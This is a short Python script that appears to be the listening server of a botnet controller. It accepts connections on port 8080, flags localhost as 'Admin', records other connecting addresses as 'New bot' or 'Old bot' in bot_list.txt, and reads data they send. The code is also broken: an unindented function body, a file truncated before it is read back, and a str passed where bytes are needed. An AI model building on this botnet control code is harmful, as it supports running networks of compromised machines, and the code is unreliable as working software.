import socket
from colorama import Fore, Back, Style

sock = socket.socket()

def send_data():

port = 8080
sock.bind(('', port))
sock.listen(10000)

while True:

  conn, addr = sock.accept()

  print(Fore.GREEN + ' [!] Connection:' + Fore.BLUE , addr)

  f = open("bot_list.txt", 'r')
  text = f.read()
  f.close()

  comaddr = str(addr)
  con = comaddr.split()
  #print(con[0])
  if con[0] == "('127.0.0.1',":
    print(Fore.CYAN + " [•] " + Fore.YELLOW + "Admin")
    try:
      data = conn.recv(1024).decode()
      print(data)
    except Exception as e:
      print(e)
      pass
    if not data:
      conn.send(data.upper())
      conn.close()
  if con[0] in text:
    print(Fore.CYAN + " [+] " + Fore.MAGENTA + "Old bot")
    print("")
  else:
    f = open("bot_list.txt", 'w')
    f.write(con[0] + '\n'+open('bot_list.txt','r').read())
    f.close()
    print(Fore.CYAN + " [+] " + Fore.BLUE + "New bot!!!")
    print("")
    data = conn.recv(1024)
    print(data)
    if not data:
      conn.send(data.upper())
      conn.close()

